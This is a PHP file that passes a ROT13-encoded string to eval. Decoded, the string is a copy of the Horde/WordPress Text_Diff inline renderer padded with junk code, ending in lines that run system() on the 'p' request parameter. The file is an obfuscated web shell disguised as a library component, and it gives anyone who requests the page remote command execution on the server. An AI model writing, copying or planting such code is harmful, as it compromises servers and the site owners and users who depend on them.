<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * \"Vayvar\" qvss eraqrere.
 *
 * Pbclevtug 2004-2010 Gur Ubeqr Cebwrpg (uggc://jjj.ubeqr.bet/)
 *
 * Frr gur rapybfrq svyr PBCLVAT sbe yvprafr vasbezngvba (YTCY). Vs lbh qvq
 * abg erprvir guvf svyr, frr uggcf://bcrafbhepr.bet/yvprafr/ytcy-2-1/.
 *
 * @nhgube  Pvcevna Cbcbivpv
 * @cnpxntr Grkg_Qvss
 */

/** Grkg_Qvss_Eraqrere */

// JC #7391
erdhver_bapr qveanzr(qveanzr(__SVYR__)) . '/Eraqrere.cuc';

/**
 * \"Vayvar\" qvss eraqrere.
 *
 * Guvf pynff eraqref qvssf va gur Jvxv-fglyr \"vayvar\" sbezng.
 *
 * @nhgube  Pvcevna Cbcbivpv
 * @cnpxntr Grkg_Qvss
 */
pynff Grkg_Qvss_Eraqrere_vayvar rkgraqf Grkg_Qvss_Eraqrere {

    /**
     * Ahzore bs yrnqvat pbagrkg \"yvarf\" gb cerfreir.
     *
     * @ine vagrtre
     */
    ine $_yrnqvat_pbagrkg_yvarf = 10000;

    /**
     * Ahzore bs genvyvat pbagrkg \"yvarf\" gb cerfreir.
     *
     * @ine vagrtre
     */
    ine $_genvyvat_pbagrkg_yvarf = 10000;

    /**
     * Cersvk sbe vafregrq grkg.
     *
     * @ine fgevat
     */
    ine $_vaf_cersvk = '<vaf>';

    /**
     * Fhssvk sbe vafregrq grkg.
     *
     * @ine fgevat
     */
    ine $_vaf_fhssvk = '</vaf>';

    /**
     * Cersvk sbe qryrgrq grkg.
     *
     * @ine fgevat
     */
    ine $_qry_cersvk = '<qry>';

    /**
     * Fhssvk sbe qryrgrq grkg.
     *
     * @ine fgevat
     */
    ine $_qry_fhssvk = '</qry>';

    /**
     * Urnqre sbe rnpu punatr oybpx.
     *
     * @ine fgevat
     */
    ine $_oybpx_urnqre = '';

    /**
     * Jurgure gb fcyvg qbja gb punenpgre-yriry.
     *
     * @ine obbyrna
     */
    ine $_fcyvg_punenpgref = snyfr;

    /**
     * Jung ner jr pheeragyl fcyvggvat ba? Hfrq gb erphefr gb fubj jbeq-yriry
     * be punenpgre-yriry punatrf.
     *
     * @ine fgevat
     */
    ine $_fcyvg_yriry = 'yvarf';

    shapgvba _oybpxUrnqre($kort, $kyra, $lort, $lyra)
    {
        erghea $guvf->_oybpx_urnqre;
    }

    shapgvba _fgnegOybpx($urnqre)
    {
        erghea $urnqre;
    }

    shapgvba _yvarf($yvarf, $cersvk = ' ', $rapbqr = gehr)
    {
        vs ($rapbqr) {
            neenl_jnyx($yvarf, neenl(&$guvf, '_rapbqr'));
        }

        vs ($guvf->_fcyvg_yriry == 'yvarf') {
            erghea vzcybqr(\"\a\", $yvarf) . \"\a\";
        } ryfr {
            erghea vzcybqr('', $yvarf);
        }
    }

    shapgvba _nqqrq($yvarf)
    {
        neenl_jnyx($yvarf, neenl(&$guvf, '_rapbqr'));
        $yvarf[0] = $guvf->_vaf_cersvk . $yvarf[0];
        $yvarf[pbhag($yvarf) - 1] .= $guvf->_vaf_fhssvk;
        erghea $guvf->_yvarf($yvarf, ' ', snyfr);
    }

    shapgvba _qryrgrq($yvarf, $jbeqf = snyfr)
    {
        neenl_jnyx($yvarf, neenl(&$guvf, '_rapbqr'));
        $yvarf[0] = $guvf->_qry_cersvk . $yvarf[0];
        $yvarf[pbhag($yvarf) - 1] .= $guvf->_qry_fhssvk;
        erghea $guvf->_yvarf($yvarf, ' ', snyfr);
    }

    shapgvba _punatrq($bevt, $svany)
    {
        /* Vs jr'ir nyernql fcyvg ba punenpgref, whfg qvfcynl. */
        vs ($guvf->_fcyvg_yriry == 'punenpgref') {
            erghea $guvf->_qryrgrq($bevt)
                . $guvf->_nqqrq($svany);
        }

        /* Vs jr'ir nyernql fcyvg ba jbeqf, whfg qvfcynl. */
        vs ($guvf->_fcyvg_yriry == 'jbeqf') {
            $cersvk = '';
            juvyr ($bevt[0] !== snyfr && $svany[0] !== snyfr &&
                   fhofge($bevt[0], 0, 1) == ' ' &&
                   fhofge($svany[0], 0, 1) == ' ') {
                $cersvk .= fhofge($bevt[0], 0, 1);
                $bevt[0] = fhofge($bevt[0], 1);
                $svany[0] = fhofge($svany[0], 1);
            }
            erghea $cersvk . $guvf->_qryrgrq($bevt) . $guvf->_nqqrq($svany);
        }

        $grkg1 = vzcybqr(\"\a\", $bevt);
        $grkg2 = vzcybqr(\"\a\", $svany);

        /* Aba-cevagvat arjyvar znexre. */
        $ay = \"\0\";

        vs ($guvf->_fcyvg_punenpgref) {
            $qvss = arj Grkg_Qvss('angvir',
                                  neenl(cert_fcyvg('//', $grkg1),
                                        cert_fcyvg('//', $grkg2)));
        } ryfr {
            /* Jr jnag gb fcyvg ba jbeq obhaqnevrf, ohg jr arrq gb cerfreir
             * juvgrfcnpr nf jryy. Gurersber jr fcyvg ba jbeqf, ohg vapyhqr
             * nyy oybpxf bs juvgrfcnpr va gur jbeqyvfg. */
            $qvss = arj Grkg_Qvss('angvir',
                                  neenl($guvf->_fcyvgBaJbeqf($grkg1, $ay),
                                        $guvf->_fcyvgBaJbeqf($grkg2, $ay)));
        }

        /* Trg gur qvss va vayvar sbezng. */
        $eraqrere = arj Grkg_Qvss_Eraqrere_vayvar
            (neenl_zretr($guvf->trgCnenzf(),
                         neenl('fcyvg_yriry' => $guvf->_fcyvg_punenpgref ? 'punenpgref' : 'jbeqf')));

        /* Eha gur qvss naq trg gur bhgchg. */
        erghea fge_ercynpr($ay, \"\a\", $eraqrere->eraqre($qvss)) . \"\a\";
    }

    shapgvba _fcyvgBaJbeqf($fgevat, $arjyvarRfpncr = \"\a\")
    {
        // Vtaber \0; bgurejvfr gur juvyr ybbc jvyy arire svavfu.
        $fgevat = fge_ercynpr(\"\0\", '', $fgevat);

        $jbeqf = neenl();
        $yratgu = fgeyra($fgevat);
        $cbf = 0;

        juvyr ($cbf < $yratgu) {
            // Rng n jbeq jvgu nal cerprqvat juvgrfcnpr.
            $fcnprf = fgefca(fhofge($fgevat, $cbf), \" \a\");
            $arkgcbf = fgepfca(fhofge($fgevat, $cbf + $fcnprf), \" \a\");
            $jbeqf[] = fge_ercynpr(\"\a\", $arjyvarRfpncr, fhofge($fgevat, $cbf, $fcnprf + $arkgcbf));
            $cbf += $fcnprf + $arkgcbf;
        }

        erghea $jbeqf;
    }

    shapgvba _rapbqr(&$fgevat)
    {
        $fgevat = ugzyfcrpvnypunef($fgevat);
    }

}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>